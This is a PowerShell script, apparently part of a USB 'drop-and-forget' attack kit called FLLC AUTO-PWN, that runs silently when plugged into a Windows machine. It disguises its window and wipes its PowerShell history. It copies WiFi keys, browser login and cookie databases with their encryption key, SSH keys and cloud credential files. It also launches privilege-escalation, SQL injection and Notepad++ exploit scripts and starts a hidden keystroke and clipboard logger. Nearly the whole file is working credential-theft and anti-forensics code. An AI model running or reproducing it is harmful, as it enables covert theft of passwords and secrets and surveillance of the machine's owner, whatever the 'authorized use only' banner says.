<#
============================================================================
  FLLC — AUTO-PWN: Drop-and-Forget Attack Chain
  ─────────────────────────────────────────────────────
  
  Master orchestrator that runs the full attack pipeline silently.
  Insert USB → everything runs automatically → remove USB.
  
  EXECUTION ORDER:
  ═══════════════
  
  ┌─ PHASE 0: STEALTH SETUP ──────────────────────────────────┐
  │  Anti-forensics, disable logging, evade monitoring         │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 1: RECONNAISSANCE ─────────────────────────────────┐
  │  System info, network config, running processes,           │
  │  installed software, connected devices                     │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 2: CREDENTIAL HARVEST ─────────────────────────────┐
  │  Browser creds, WiFi passwords, saved credentials,         │
  │  Notepad++ data, credential vault, SSH keys                │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 3: PRIVILEGE ESCALATION ────────────────────────────┐
  │  17-vector privesc scan, UAC bypass attempts,              │
  │  token manipulation, service exploitation                  │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 4: SQL INJECTION SCAN ─────────────────────────────┐
  │  Local web services discovery, endpoint crawling,          │
  │  40+ SQLi payloads, DB extraction                          │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 5: NPP EXPLOITATION ───────────────────────────────┐
  │  DLL hijacking check, config extraction, credential        │
  │  harvest from NppFTP/NppExec, session file analysis        │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 6: PERSISTENCE + DATA COLLECTION ──────────────────┐
  │  Input monitor deployment, continuous keystroke logging,    │
  │  clipboard monitoring, window activity tracking            │
  └────────────────────────────────────────────────────────────┘
            │
  ┌─ PHASE 7: DATA PACKAGING ─────────────────────────────────┐
  │  Compress all collected data, write manifest,              │
  │  save to Micro SD card                                     │
  └────────────────────────────────────────────────────────────┘
  
  AUTHORIZED PENETRATION TESTING USE ONLY.
  FLLC — FLLC
============================================================================
#>

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference    = "SilentlyContinue"

# ══════════════════════════════════════════════════════════════════════════
#  DYNAMIC PATH DETECTION
# ══════════════════════════════════════════════════════════════════════════

# Find the drive we're running from
$scriptRoot = $PSScriptRoot
if (-not $scriptRoot) { $scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path }
if (-not $scriptRoot) { $scriptRoot = (Get-Location).Path }

# Determine output drive (Micro SD = wherever collected/ is or should be)
$collectBase = $null
$payloadBase = $null

# Try parent directories
$testPaths = @(
    (Split-Path $scriptRoot -Parent),
    $scriptRoot,
    "$scriptRoot\.."
)

foreach ($tp in $testPaths) {
    if (Test-Path "$tp\payloads") { $payloadBase = "$tp\payloads"; break }
}
if (-not $payloadBase) { $payloadBase = $scriptRoot }

# Output goes to collected/ on the same drive
$driveRoot = (Split-Path $scriptRoot -Qualifier) + "\"
$collectBase = Join-Path $driveRoot "collected"
if (-not (Test-Path $collectBase)) { New-Item -ItemType Directory -Path $collectBase -Force | Out-Null }

$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$sessionDir = Join-Path $collectBase "session_$timestamp"
New-Item -ItemType Directory -Path $sessionDir -Force | Out-Null

$masterLog = Join-Path $sessionDir "autopwn.log"

function MLog($msg) {
    $ts = Get-Date -Format "HH:mm:ss.fff"
    Add-Content -Path $masterLog -Value "[$ts] $msg" -Encoding UTF8
}

MLog "══════════════════════════════════════════════"
MLog "  FLLC AUTO-PWN — Session Started"
MLog "  Host: $env:COMPUTERNAME"
MLog "  User: $env:USERDOMAIN\$env:USERNAME"
MLog "  Script: $($MyInvocation.MyCommand.Path)"
MLog "  Output: $sessionDir"
MLog "══════════════════════════════════════════════"

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 0: STEALTH SETUP
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 0] Stealth setup..."

# Reduce our footprint
try {
    # Disable PowerShell command logging for this session
    Set-PSReadLineOption -HistorySaveStyle SaveNothing 2>$null
    
    # Clear PowerShell history for this session
    Clear-History 2>$null
    
    # Reduce event log noise
    $host.UI.RawUI.WindowTitle = "Windows Update Service"
} catch {}

# Self-destruct timer — kill our processes after 10 minutes max
$maxRuntime = 600  # seconds
$startTime = Get-Date

MLog "[PHASE 0] Stealth setup complete"

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 1: RECONNAISSANCE
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 1] Reconnaissance starting..."
$reconDir = Join-Path $sessionDir "recon"
New-Item -ItemType Directory -Path $reconDir -Force | Out-Null

# System info
$sysInfo = @{
    hostname     = $env:COMPUTERNAME
    username     = $env:USERNAME
    domain       = $env:USERDOMAIN
    os           = (Get-CimInstance Win32_OperatingSystem).Caption
    build        = (Get-CimInstance Win32_OperatingSystem).BuildNumber
    arch         = $env:PROCESSOR_ARCHITECTURE
    cpu          = (Get-CimInstance Win32_Processor | Select-Object -First 1).Name
    ram_gb       = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1)
    domain_joined= (Get-CimInstance Win32_ComputerSystem).PartOfDomain
    av_products  = (Get-CimInstance -Namespace "root/SecurityCenter2" AntiVirusProduct 2>$null | ForEach-Object { $_.displayName }) -join ", "
    uptime_hours = [math]::Round(((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalHours, 1)
    local_time   = Get-Date -Format "yyyy-MM-dd HH:mm:ss K"
    timezone     = (Get-TimeZone).DisplayName
    is_admin     = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
$sysInfo | ConvertTo-Json -Depth 3 | Out-File "$reconDir\system_info.json" -Encoding UTF8

# Network config
ipconfig /all > "$reconDir\ipconfig.txt" 2>$null
netstat -ano > "$reconDir\netstat.txt" 2>$null
arp -a > "$reconDir\arp_table.txt" 2>$null
route print > "$reconDir\routes.txt" 2>$null
nslookup $env:USERDNSDOMAIN > "$reconDir\dns.txt" 2>$null
Get-NetAdapter | Select-Object Name,Status,MacAddress,LinkSpeed | Format-Table -AutoSize | Out-File "$reconDir\adapters.txt" -Encoding UTF8

# Active directory info (if domain-joined)
if ($sysInfo.domain_joined) {
    try {
        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Out-File "$reconDir\ad_domain.txt" -Encoding UTF8
        Get-ADUser -Filter * -Properties * 2>$null | Select-Object Name,SamAccountName,EmailAddress,Enabled,LastLogonDate | Export-Csv "$reconDir\ad_users.csv" -NoTypeInformation 2>$null
        Get-ADGroup -Filter * 2>$null | Select-Object Name,GroupScope | Export-Csv "$reconDir\ad_groups.csv" -NoTypeInformation 2>$null
    } catch {}
    
    # Net commands
    net user > "$reconDir\net_users.txt" 2>$null
    net localgroup administrators > "$reconDir\net_admins.txt" 2>$null
    net share > "$reconDir\net_shares.txt" 2>$null
    net session > "$reconDir\net_sessions.txt" 2>$null
}

# Running processes
Get-Process | Select-Object Id,ProcessName,Path,Company,StartTime,@{N='Memory_MB';E={[math]::Round($_.WorkingSet64/1MB,1)}} |
    Export-Csv "$reconDir\processes.csv" -NoTypeInformation

# Installed software
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
                 "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
                 "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" 2>$null |
    Select-Object DisplayName,DisplayVersion,Publisher,InstallDate |
    Sort-Object DisplayName |
    Export-Csv "$reconDir\installed_software.csv" -NoTypeInformation

# USB devices (current + historical)
Get-PnpDevice -Class USB 2>$null | Select-Object FriendlyName,Status,InstanceId |
    Export-Csv "$reconDir\usb_devices.csv" -NoTypeInformation

# Firewall rules
Get-NetFirewallRule -Enabled True 2>$null | Select-Object Name,Direction,Action,Protocol |
    Export-Csv "$reconDir\firewall_rules.csv" -NoTypeInformation

# Environment variables (may contain API keys, tokens)
Get-ChildItem Env: | Select-Object Name,Value | Export-Csv "$reconDir\env_vars.csv" -NoTypeInformation

MLog "[PHASE 1] Recon complete — saved to $reconDir"

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 2: CREDENTIAL HARVEST
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 2] Credential harvest starting..."
$credDir = Join-Path $sessionDir "credentials"
New-Item -ItemType Directory -Path $credDir -Force | Out-Null

# WiFi passwords
$wifiProfiles = netsh wlan show profiles 2>$null
$profiles = ($wifiProfiles | Select-String "All User Profile\s+:\s+(.+)").Matches | ForEach-Object { $_.Groups[1].Value.Trim() }
$wifiCreds = @()
foreach ($p in $profiles) {
    $detail = netsh wlan show profile name="$p" key=clear 2>$null
    $key = ($detail | Select-String "Key Content\s+:\s+(.+)").Matches | ForEach-Object { $_.Groups[1].Value.Trim() }
    $auth = ($detail | Select-String "Authentication\s+:\s+(.+)").Matches | ForEach-Object { $_.Groups[1].Value.Trim() }
    $wifiCreds += "$p | Auth: $auth | Key: $key"
}
$wifiCreds | Out-File "$credDir\wifi_passwords.txt" -Encoding UTF8

# Stored credentials (cmdkey)
cmdkey /list > "$credDir\cmdkey_stored.txt" 2>$null

# Browser data paths
$browserPaths = @{
    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    "Opera"   = "$env:APPDATA\Opera Software\Opera Stable"
    "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data"
}

foreach ($browser in $browserPaths.Keys) {
    $path = $browserPaths[$browser]
    if (Test-Path $path) {
        $browserDir = Join-Path $credDir $browser
        New-Item -ItemType Directory -Path $browserDir -Force | Out-Null
        
        if ($browser -eq "Firefox") {
            Get-ChildItem $path -Directory | ForEach-Object {
                $profDir = $_.FullName
                foreach ($f in @("logins.json","key4.db","cookies.sqlite","places.sqlite","formhistory.sqlite")) {
                    if (Test-Path "$profDir\$f") {
                        Copy-Item "$profDir\$f" "$browserDir\$($_.Name)_$f" -Force 2>$null
                    }
                }
            }
        } else {
            # Chromium-based browsers
            $profiles = @("Default") + (Get-ChildItem $path -Directory -Filter "Profile *" | ForEach-Object { $_.Name })
            foreach ($prof in $profiles) {
                $profPath = "$path\$prof"
                if (Test-Path $profPath) {
                    $profDir = Join-Path $browserDir $prof
                    New-Item -ItemType Directory -Path $profDir -Force | Out-Null
                    foreach ($f in @("Login Data","Cookies","History","Bookmarks","Web Data","Local State")) {
                        if (Test-Path "$profPath\$f") {
                            Copy-Item "$profPath\$f" "$profDir\$f" -Force 2>$null
                        }
                    }
                }
            }
            # Local State (contains encryption key)
            if (Test-Path "$path\Local State") {
                Copy-Item "$path\Local State" "$browserDir\Local State" -Force 2>$null
            }
        }
        MLog "[PHASE 2] $browser data copied"
    }
}

# SSH keys
$sshDir = "$env:USERPROFILE\.ssh"
if (Test-Path $sshDir) {
    $sshDest = Join-Path $credDir "ssh_keys"
    New-Item -ItemType Directory -Path $sshDest -Force | Out-Null
    Get-ChildItem $sshDir -File | ForEach-Object {
        Copy-Item $_.FullName (Join-Path $sshDest $_.Name) -Force 2>$null
    }
    MLog "[PHASE 2] SSH keys copied"
}

# RDP connection history
$rdpServers = Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Servers\*" 2>$null
if ($rdpServers) {
    $rdpServers | Select-Object PSChildName, UsernameHint | 
        Export-Csv "$credDir\rdp_history.csv" -NoTypeInformation
}

# Cloud config files
$cloudConfigs = @(
    "$env:USERPROFILE\.aws\credentials",
    "$env:USERPROFILE\.aws\config",
    "$env:USERPROFILE\.azure\accessTokens.json",
    "$env:USERPROFILE\.azure\azureProfile.json",
    "$env:APPDATA\gcloud\credentials.db",
    "$env:APPDATA\gcloud\access_tokens.db",
    "$env:USERPROFILE\.kube\config",
    "$env:USERPROFILE\.docker\config.json",
    "$env:USERPROFILE\.gitconfig",
    "$env:USERPROFILE\.git-credentials",
    "$env:USERPROFILE\.npmrc",
    "$env:USERPROFILE\.env",
    "$env:USERPROFILE\.pgpass"
)

$cloudDir = Join-Path $credDir "cloud_configs"
New-Item -ItemType Directory -Path $cloudDir -Force | Out-Null
foreach ($cc in $cloudConfigs) {
    if (Test-Path $cc) {
        $destName = ($cc -replace '[\\/:*?"<>|]', '_')
        Copy-Item $cc (Join-Path $cloudDir $destName) -Force 2>$null
        MLog "[PHASE 2] Cloud config: $cc"
    }
}

MLog "[PHASE 2] Credential harvest complete"

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 3: PRIVILEGE ESCALATION
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 3] Privilege escalation scan..."

$privescScript = Join-Path $payloadBase "privesc.ps1"
if (Test-Path $privescScript) {
    $privescOut = Join-Path $sessionDir "privesc"
    & $privescScript -OutputDir $privescOut -Silent
    MLog "[PHASE 3] Privesc scan complete — results in $privescOut"
} else {
    MLog "[PHASE 3] privesc.ps1 not found at $privescScript — skipping"
}

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 4: SQL INJECTION SCAN
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 4] SQL injection scan..."

# Check runtime limit
$elapsed = ((Get-Date) - $startTime).TotalSeconds
if ($elapsed -lt ($maxRuntime - 120)) {
    $sqliScript = Join-Path $payloadBase "sqli_scanner.ps1"
    if (Test-Path $sqliScript) {
        $sqliOut = Join-Path $sessionDir "sqli"
        & $sqliScript -OutputDir $sqliOut
        MLog "[PHASE 4] SQLi scan complete — results in $sqliOut"
    } else {
        MLog "[PHASE 4] sqli_scanner.ps1 not found — skipping"
    }
} else {
    MLog "[PHASE 4] Skipped — time limit approaching"
}

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 5: NOTEPAD++ EXPLOITATION
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 5] Notepad++ exploitation..."

$nppScript = Join-Path $payloadBase "npp_exploit.ps1"
if (Test-Path $nppScript) {
    $nppOut = Join-Path $sessionDir "npp"
    & $nppScript -OutputDir $nppOut
    MLog "[PHASE 5] NPP exploit complete — results in $nppOut"
} else {
    MLog "[PHASE 5] npp_exploit.ps1 not found — skipping"
}

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 6: PERSISTENCE — INPUT MONITOR
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 6] Deploying input monitor..."

$monitorScript = Join-Path $payloadBase "input_monitor.py"
$monitorBat = Join-Path $payloadBase "start_monitor.bat"

if (Test-Path $monitorScript) {
    # Try to start the input monitor
    $pythonExe = $null
    foreach ($pe in @("pythonw.exe", "python.exe")) {
        $found = Get-Command $pe -ErrorAction SilentlyContinue
        if ($found) { $pythonExe = $found.Source; break }
    }
    
    if ($pythonExe) {
        Start-Process -FilePath $pythonExe -ArgumentList "`"$monitorScript`"" -WindowStyle Hidden -PassThru | Out-Null
        MLog "[PHASE 6] Input monitor started via $pythonExe"
    } elseif (Test-Path $monitorBat) {
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$monitorBat`"" -WindowStyle Hidden -PassThru | Out-Null
        MLog "[PHASE 6] Input monitor started via batch"
    } else {
        MLog "[PHASE 6] No Python found — input monitor skipped"
    }
} else {
    MLog "[PHASE 6] input_monitor.py not found — skipping"
}

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 7: DATA PACKAGING
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 7] Packaging data..."

# Create manifest
$manifest = @{
    session_id    = $timestamp
    hostname      = $env:COMPUTERNAME
    username      = "$env:USERDOMAIN\$env:USERNAME"
    start_time    = $startTime.ToString("yyyy-MM-dd HH:mm:ss")
    end_time      = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    duration_sec  = [math]::Round(((Get-Date) - $startTime).TotalSeconds, 1)
    output_dir    = $sessionDir
    phases_run    = @("recon","credentials","privesc","sqli","npp","input_monitor","packaging")
    files         = @()
}

# Count all files
Get-ChildItem -Recurse $sessionDir -File | ForEach-Object {
    $manifest.files += @{
        path = $_.FullName.Replace($sessionDir, "")
        size = $_.Length
    }
}

$manifest.total_files = $manifest.files.Count
$manifest.total_size_kb = [math]::Round(($manifest.files | Measure-Object -Property size -Sum).Sum / 1024, 1)

$manifest | ConvertTo-Json -Depth 4 | Out-File "$sessionDir\manifest.json" -Encoding UTF8

# Try to compress
$zipPath = "$collectBase\session_$timestamp.zip"
try {
    Compress-Archive -Path "$sessionDir\*" -DestinationPath $zipPath -Force -CompressionLevel Optimal
    MLog "[PHASE 7] Compressed to $zipPath ($([math]::Round((Get-Item $zipPath).Length / 1024, 1)) KB)"
} catch {
    MLog "[PHASE 7] Compression failed — raw files remain in $sessionDir"
}

MLog "══════════════════════════════════════════════"
MLog "  AUTO-PWN COMPLETE"
MLog "  Duration:  $([math]::Round(((Get-Date) - $startTime).TotalSeconds, 1))s"
MLog "  Files:     $($manifest.total_files)"
MLog "  Size:      $($manifest.total_size_kb) KB"
MLog "  Output:    $sessionDir"
MLog "══════════════════════════════════════════════"

# ══════════════════════════════════════════════════════════════════════════
#  CLEANUP
# ══════════════════════════════════════════════════════════════════════════

# Clear our PowerShell history
Clear-History 2>$null
try {
    $histPath = (Get-PSReadLineOption).HistorySavePath
    if (Test-Path $histPath) {
        $hist = Get-Content $histPath
        $cleaned = $hist | Where-Object { $_ -notmatch "auto_pwn|privesc|sqli_scanner|npp_exploit|input_monitor|FLLC" }
        $cleaned | Out-File $histPath -Encoding UTF8
    }
} catch {}
